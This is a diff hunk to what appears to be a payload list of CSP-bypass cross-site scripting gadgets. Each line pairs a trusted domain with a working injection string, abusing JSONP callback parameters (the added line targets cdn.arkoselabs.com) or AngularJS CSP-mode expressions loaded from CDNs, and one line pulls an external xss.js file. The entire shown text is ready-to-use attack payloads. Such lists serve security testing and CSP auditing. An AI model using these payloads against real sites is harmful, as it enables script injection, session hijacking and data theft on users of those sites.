@@ -35,6 +35,7 @@ bebezoo.1688.com	<script src="https://bebezoo.1688.com/fragment/index.htm?callba
 bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
 cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>
+cdn.arkoselabs.com	<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>
 cdn.bootcdn.net	<body ng-app ng-csp><script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 cdn.jsdelivr.net	<body ng-app ng-csp><script src="https://cdn.jsdelivr.net/npm/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>
